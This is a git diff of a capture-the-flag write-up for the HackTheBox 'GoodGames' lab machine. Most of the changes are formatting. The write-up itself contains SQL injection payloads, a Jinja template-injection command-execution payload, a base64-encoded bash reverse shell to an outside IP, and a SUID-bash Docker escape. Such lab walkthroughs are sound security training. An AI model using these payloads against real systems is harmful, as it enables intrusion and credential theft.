@@ -1,19 +1,19 @@
 # GoodGames
 
-![hackthebox.com - © HACKTHEBOX](.gitbook/assets/logo-htb2.png)
+![hackthebox.com - © HACKTHEBOX](<../../../../.gitbook/assets/logo-htb2 (1).png>)
 
----
+***
 
 ## Intro
 
-| Box Info           | ![](.gitbook/assets/goodgames.png)                   |
-| :----------------- | ---------------------------------------------------- |
+| Box Info            | ![](../../../../.gitbook/assets/goodgames.png)       |
+| ------------------- | ---------------------------------------------------- |
 | 🔗 Name             | [GoodGames](https://app.hackthebox.com/machines/446) |
 | 🎯 Target IP        | `10.10.11.130`                                       |
-| 📈 Difficulty level | 🟩Easy                                                |
+| 📈 Difficulty level | 🟩Easy                                               |
 | 🐧OS                | Linux                                                |
 
----
+***
 
 ## Recon
 
@@ -53,9 +53,9 @@ PORT   STATE SERVICE REASON         VERSION
 
 Browse to `http://10.10.11.130:80`
 
-- Python webserver
-- Login page found
-- Footer says `GoodGames.htb`
+* Python webserver
+* Login page found
+* Footer says `GoodGames.htb`
 
 Add the found values to the `/etc/hosts` file
 
@@ -85,22 +85,22 @@ feroxbuster -u http://goodgames.htb
 
 Start BurpSuite and intercept traffic from browser via FoxyProxy.
 
-- Create an account at `http://10.10.11.130/signup`
+* Create an account at `http://10.10.11.130/signup`
 
-![](.gitbook/assets/2025-07-06_22-39-01_217.png)
+![](../../../../.gitbook/assets/2025-07-06_22-39-01_217.png)
 
-- Try to login - Successful - it redirect to `/profile`
+* Try to login - Successful - it redirect to `/profile`
 
-![](.gitbook/assets/2025-07-06_22-40-12_218.png)
+![](../../../../.gitbook/assets/2025-07-06_22-40-12_218.png)
 
----
+***
 
 ## Exploitation
 
 ### SQL Injection - sqlmap
 
-- `Edit Details` form does not work - always returns `HTTP 500`
-- Check the login form for **SQL injection** using the intercepted request **in BurpSuite** (with a valid email), since the client-side JavaScript requires a valid email address to submit.
+* `Edit Details` form does not work - always returns `HTTP 500`
+* Check the login form for **SQL injection** using the intercepted request **in BurpSuite** (with a valid email), since the client-side JavaScript requires a valid email address to submit.
 
 ```bash
 # Payload for BurpSuite Request
@@ -108,13 +108,13 @@ Start BurpSuite and intercept traffic from browser via FoxyProxy.
 email=admin' or 1 = 1 -- -&password=Passw0rd
 ```
 
-- It redirects to the `admin`'s profile pages
+* It redirects to the `admin`'s profile pages
 
-![](.gitbook/assets/2025-07-06_22-47-17_220.png)
+![](../../../../.gitbook/assets/2025-07-06_22-47-17_220.png)
 
-![](.gitbook/assets/2025-07-06_22-48-51_221.png)
+![](../../../../.gitbook/assets/2025-07-06_22-48-51_221.png)
 
-- Save the request with correct email login and run `sqlmap` on it
+* Save the request with correct email login and run `sqlmap` on it
 
 ```bash
 sqlmap -r goodgames.req
@@ -136,7 +136,7 @@ Parameter: email (POST)
 [22:54:37] [INFO] the back-end DBMS is MySQL 5.0.12
 ```
 
-- Enumerate the database and tables, checking for sensitive information
+* Enumerate the database and tables, checking for sensitive information
 
 ```bash
 sqlmap -r goodgames.req --dbs
@@ -151,7 +151,7 @@ sqlmap -r goodgames.req main --tables
     [...]
 ```
 
-- Extract all the data from the `user` tables
+* Extract all the data from the `user` tables
 
 ```bash
 sqlmap -r goodgames.req --batch -D main -T user --dump
@@ -172,7 +172,7 @@ Table: user
 
 This can be done manually too - check [HTB: GoodGames | 0xdf](https://0xdf.gitlab.io/2022/02/23/htb-goodgames.html) writeup
 
-- Dump the full DB with `UNION` injection
+* Dump the full DB with `UNION` injection
 
 ```bash
 POST /login HTTP/1.1
@@ -200,7 +200,7 @@ email=' union select 1,2,3,database()-- -&password=Passw0rd
 <h2 class="h4">Welcome main</h2>
 ```
 
-- Get `main` database's tables
+* Get `main` database's tables
 
 ```bash
 email=' union select 1,2,3,concat(table_name, ',') from information_schema.tables where table_schema = 'main'-- -&password=Passw0rd
@@ -208,7 +208,7 @@ email=' union select 1,2,3,concat(table_name, ',') from information_schema.table
 <h2 class="h4">Welcome blog,blog_comments,user,</h2>
 ```
 
-- Get `users`
+* Get `users`
 
 ```bash
 email=' union select 1,2,3,concat(column_name, ',') from information_schema.columns where table_name = 'user'-- -&password=Passw0rd
@@ -222,7 +222,7 @@ email=' union select 1,2,3,concat(id, ':', name, ':', email, ':', password) from
 <h2 class="h4">Welcome 1:admin:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec2:syselement:syselement@syselement.com:47b7bfb65fa83ac9a71dcb0f6296bb6e</h2>
 ```
 
-- Dumped users are
+* Dumped users are
 
 ```bash
 1:admin:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec
@@ -267,8 +267,8 @@ Hardware.Mon.#1..: Util: 97%
 
 📌 Login with `admin@goodgames.htb:superadministrator`
 
-- As admin, there is an extra gear icon at the top right of the page, that links to
-  - `http://internal-administration.goodgames.htb/login`
+* As admin, there is an extra gear icon at the top right of the page, that links to
+  * `http://internal-administration.goodgames.htb/login`
 
 ```bash
 # Add to /etc/hosts
@@ -279,14 +279,14 @@ Hardware.Mon.#1..: Util: 97%
 
 Visit the page `http://internal-administration.goodgames.htb/login` and try to login with `admin:superadministrator`
 
-![](.gitbook/assets/2025-07-06_23-20-41_222.png)
+![](../../../../.gitbook/assets/2025-07-06_23-20-41_222.png)
 
-![](.gitbook/assets/2025-07-06_23-24-27_223.png)
+![](../../../../.gitbook/assets/2025-07-06_23-24-27_223.png)
 
 Test for **SSTI** (Server Side Template Injection) in the Python Flask application
 
-- [SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
-- [PayloadsAllTheThings/Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
+* [SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
+* [PayloadsAllTheThings/Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 
 Open user's **Settings** and try the following payload in the **Full Name** input field
 
@@ -294,11 +294,11 @@ Open user's **Settings** and try the following payload in the **Full Name** inpu
 {{7*7}}
 ```
 
-- It changed the username to the result of `49`
+* It changed the username to the result of `49`
 
-![](.gitbook/assets/2025-07-06_23-30-22_224.png)
+![](../../../../.gitbook/assets/2025-07-06_23-30-22_224.png)
 
-- Find which template engine it is using
+* Find which template engine it is using
 
 ```bash
 {{7*'7'}}
@@ -306,17 +306,17 @@ Open user's **Settings** and try the following payload in the **Full Name** inpu
 7777777
 ```
 
-- The template engine is `Jinja`
-- Check system commands execution via the following SSTI
+* The template engine is `Jinja`
+* Check system commands execution via the following SSTI
 
 ```bash
 {{ namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
-![](.gitbook/assets/2025-07-06_23-37-08_225.png)
+![](../../../../.gitbook/assets/2025-07-06_23-37-08_225.png)
 
-- It works, and is `root` too
-- Get a reverse shell with the same payload, encoding the payload to base64 first
+* It works, and is `root` too
+* Get a reverse shell with the same payload, encoding the payload to base64 first
 
 ```bash
 echo -ne 'bash -i >& /dev/tcp/10.10.14.29/1234 0>&1' | base64
@@ -332,9 +332,9 @@ nc -nvlp 1234
 {{ namespace.__init__.__globals__.os.popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOS8xMjM0IDA+JjE="|base64 -d|bash').read() }}
 ```
 
-![](.gitbook/assets/2025-07-06_23-42-07_226.png)
+![](../../../../.gitbook/assets/2025-07-06_23-42-07_226.png)
 
-- Get a better shell
+* Get a better shell
 
 ```bash
 script /dev/null -c bash
@@ -352,9 +352,9 @@ root@3a453ab39d3d:/backend# ip -o a
 5: eth0    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0\       valid_lft forever preferred_lft forever
 ```
 
-- By checking the IP, it can be found out the reverse shell is inside a Docker container
+* By checking the IP, it can be found out the reverse shell is inside a Docker container
 
----
+***
 
 ## Foothold
 
@@ -408,8 +408,8 @@ cat /home/augustus/user.txt
 dc2bb***************************
 ```
 
-- The `1000` UID hints that the user's home is mounted inside the Docker container from the main system, since there is no `augustus` user or `1000` UID in the container's `/etc/passwd`
-  - confirm it with `mount`
+* The `1000` UID hints that the user's home is mounted inside the Docker container from the main system, since there is no `augustus` user or `1000` UID in the container's `/etc/passwd`
+  * confirm it with `mount`
 
 ```bash
 root@3a453ab39d3d:~# cat /etc/passwd | grep 1000
@@ -439,8 +439,8 @@ port 22 is open
 port 80 is open
 ```
 
-- `SSH` is listening internally. Attempt a password reuse for both `root` and `augustus` accounts
-  - 📌 `augustus:superadministrator` works!
+* `SSH` is listening internally. Attempt a password reuse for both `root` and `augustus` accounts
+  * 📌 `augustus:superadministrator` works!
 
 ```bash
 ssh augustus@172.19.0.1
@@ -465,15 +465,15 @@ augustus@GoodGames:~$ hostname -I
 10.10.11.130 172.19.0.1 172.17.0.1 dead:beef::250:56ff:fe94:5b3b 
 ```
 
-- The shell is the GoodGames host itself
+* The shell is the GoodGames host itself
 
----
+***
 
 ## Privilege Escalation
 
 ### Docker Escape
 
-- Docker is in the process list, confirming the app is hosted within a Docker container
+* Docker is in the process list, confirming the app is hosted within a Docker container
 
 ```bash
 augustus@GoodGames:~$ ps aux | grep docker
@@ -483,12 +483,12 @@ root      1324  0.0  0.2 1148904 11688 ?       Sl   21:14   0:00 /usr/bin/docker
 
 ### Shell as root
 
-- The `augustus` home contains the same files as inside the container
-- Files can be written in the host and change their permissions to root within the container, reflecting the permissions on the host system as well
+* The `augustus` home contains the same files as inside the container
+* Files can be written in the host and change their permissions to root within the container, reflecting the permissions on the host system as well
 
 Copy host's `bash` binary to the user's directory and exit the SSH session
 
-- The `bash` binary must be **the one from the host**, not from the container (which uses an older library)
+* The `bash` binary must be **the one from the host**, not from the container (which uses an older library)
 
 ```bash
 # On Host
@@ -509,8 +509,8 @@ root@3a453ab39d3d:/home/augustus# chown root:root bash
 root@3a453ab39d3d:/home/augustus# chmod 4755 bash
 ```
 
-- SSH back into the host
-  - changes to `bash` file are reflected
+* SSH back into the host
+  * changes to `bash` file are reflected
 
 ```bash
 ssh augustus@172.19.0.1
@@ -519,7 +519,7 @@ augustus@GoodGames:~$ ls -lh bash
 -rwsr-xr-x 1 root root 1.2M Jul  6 23:12 bash
 ```
 
-- Spawn a shell with the effective UID (`euid`) of root
+* Spawn a shell with the effective UID (`euid`) of root
 
 ```bash
 augustus@GoodGames:~$ ./bash -p
@@ -534,7 +534,7 @@ bash-5.1# cat /root/root.txt
 e88fa***************************
 ```
 
----
+***
 
 ## Summary
 
@@ -547,12 +547,11 @@ e88fa***************************
 7. Reused the same password to **SSH into the host** as `augustus`, from the container.
 8. Used the mounted home directory to drop a **SUID** `bash` binary and escalate to root.
 
----
+***
 
 ## Extra
 
-- [HTB: GoodGames | 0xdf hacks stuff](https://0xdf.gitlab.io/2022/02/23/htb-goodgames.html)
-- [SQLi, SSTI & Docker Escapes / Mounted Folders - HackTheBox University CTF "GoodGame" - John Hammond](https://www.youtube.com/watch?v=0oTuH_xY3mw)
+* [HTB: GoodGames | 0xdf hacks stuff](https://0xdf.gitlab.io/2022/02/23/htb-goodgames.html)
+* [SQLi, SSTI & Docker Escapes / Mounted Folders - HackTheBox University CTF "GoodGame" - John Hammond](https://www.youtube.com/watch?v=0oTuH_xY3mw)
 
-------
-
+***
